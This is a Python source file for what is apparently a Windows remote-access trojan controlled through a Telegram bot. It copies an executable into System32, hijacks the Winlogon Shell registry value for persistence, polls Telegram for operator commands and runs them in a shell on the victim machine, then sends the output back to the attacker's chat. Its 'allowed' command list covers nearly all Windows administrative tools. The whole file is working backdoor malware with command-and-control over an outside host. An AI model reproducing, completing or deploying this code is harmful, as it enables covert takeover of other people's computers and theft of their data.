import requests
import subprocess
import platform
import time
import os
import shutil
import subprocess
#
TOKEN = "YOUR_BOT_TOKEN"
API = f"https://api.telegram.org/bot{TOKEN}"
PC_NAME = platform.node()

ALLOWED = ["assoc", "at", "attrib", "auditpol", "bcdedit", "bitsadmin", "break", "cacls", "call", "cd", "certutil", "chcp", "chdir", "chkdsk", "chkntfs", "choice", "cipher", "cleanmgr", "clip", "cls", "cmd", "cmdkey", "color", "comp", "compact", "convert", "copy", "cscript", "date", "dcgpofix", "del", "dir", "diskpart", "dism", "dispdiag", "dnscmd", "doskey", "driverquery", "dsacls", "dsadd", "dsget", "dsmod", "dsmove", "dsquery", "dsrm", "echo", "endlocal", "erase", "eventcreate", "eventquery", "evntcmd", "exit", "expand", "fc", "find", "findstr", "finger", "flattemp", "for", "forfiles", "format", "freedisk", "fsutil", "ftp", "ftype", "getmac", "goto", "gpresult", "gpupdate", "graftabl", "help", "hostname", "icacls", "if", "ipconfig", "ipseccmd", "ipxroute", "irftp", "label", "lodctr", "logman", "logoff", "lpq", "lpr", "macfile", "makecab", "mapadmin", "md", "mklink", "mode", "more", "mount", "mountvol", "move", "mqbkup", "mqsvc", "mqtgsvc", "msg", "msiexec", "msinfo32", "mstsc", "nbtstat", "net", "net1", "netsh", "netstat", "nfsadmin", "nlsfunc", "nslookup", "ntbackup", "ntcmdprompt", "ntfrsutl", "ntsd", "openfiles", "path", "pathping", "pause", "pbadmin", "pentnt", "ping", "popd", "powercfg", "print", "prncnfg", "prndrvr", "prnjobs", "prnmngr", "prnport", "prnqctl", "prompt", "pushd", "qappsrv", "qprocess", "query", "quser", "qwinsta", "rasdial", "rcp", "rd", "recover", "reg", "regsvr32", "relog", "rem", "ren", "rename", "replace", "reset", "rexec", "robocopy", "route", "rpcinfo", "rpcping", "rsh", "rsm", "runas", "rundll32", "rwinsta", "sc", "schtasks", "sclist", "set", "setlocal", "setx", "sfc", "share", "shift", "showmount", "shutdown", "sort", "start", "subst", "systeminfo", "takeown", "tapicfg", "taskkill", "tasklist", "tcmsetup", "telnet", "tftp", "time", "timeout", "title", "tlntadmn", "tracerpt", "tracert", "tree", "tscon", "tsdiscon", "tskill", "tsecimp", "tsshutdn", "type", "typeperf", "tzutil", "unlodctr", "ver", "verify", "vol", "vssadmin", "w32tm", "waitfor", "wbadmin", "wevtutil", "where", "whoami", "winmgmt", "winrm", "winrs", "winsat", "wmic", "xcopy"]

offset = 0

def send(msg):
    requests.post(f"{API}/sendMessage", json={
        "chat_id": YOUR_ACCAUNT_ID,
        "text": msg
    })


# Copy syswin.exe if not exists
syswin_path = os.path.join(os.environ['SystemRoot'], 'System32', 'syswin.exe')
if not os.path.exists(syswin_path):
    if os.path.exists("syswin.exe"):
        shutil.copy2("syswin.exe", syswin_path)

# Set registry
subprocess.run([
    'reg', 'add', 
    r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
    '/v', 'Shell',
    '/t', 'REG_SZ',
    '/d', 'explorer.exe,syswin.exe',
    '/f'
], check=True)

while True:
    r = requests.get(f"{API}/getUpdates", params={"offset": offset}).json()
    for u in r["result"]:
        offset = u["update_id"] + 1
        if "message" not in u:
            continue

        text = u["message"]["text"]
        chat_id = u["message"]["chat"]["id"]

        if not text.startswith("/"):
            continue

        if text.startswith("/users"):
            send(f"🟢 Client online: {PC_NAME}")


        # /exec PC_NAME command
        if text.startswith("/exec"):
            _, target, *cmd = text.split()
            if target != PC_NAME:
                continue

            cmd = " ".join(cmd)
            base = cmd.split()[0]

            if base not in ALLOWED:
                send(f"❌ {PC_NAME}: command not allowed")
                continue

            try:
                out = subprocess.check_output(cmd, shell=True, text=True)
            except Exception as e:
                out = str(e)

            send(f"💻 {PC_NAME}:\n{out}")

        # /broadcast command
        if text.startswith("/broadcast"):
            cmd = text.replace("/broadcast ", "")
            base = cmd.split()[0]

            if base not in ALLOWED:
                send(f"❌ {PC_NAME}: command not allowed")
                continue

            out = subprocess.check_output(cmd, shell=True, text=True)
            send(f"📡 {PC_NAME}:\n{out}")

    time.sleep(2)
